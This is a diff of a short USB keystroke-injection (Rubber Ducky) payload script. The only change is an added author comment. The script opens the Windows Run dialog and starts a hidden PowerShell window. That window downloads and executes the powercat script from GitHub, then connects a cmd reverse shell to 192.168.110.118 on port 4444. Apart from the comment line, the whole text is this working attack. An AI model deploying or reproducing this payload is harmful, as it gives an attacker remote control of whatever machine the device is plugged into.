@@ -1,3 +1,4 @@
+REM Author: Pentestersploit/Adrilaw
 GUI r
 DELAY 500
 STRING PowerShell.exe -WindowStyle Hidden -Command "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1') ;powercat -c 192.168.110.118 -p 4444 -e cmd"
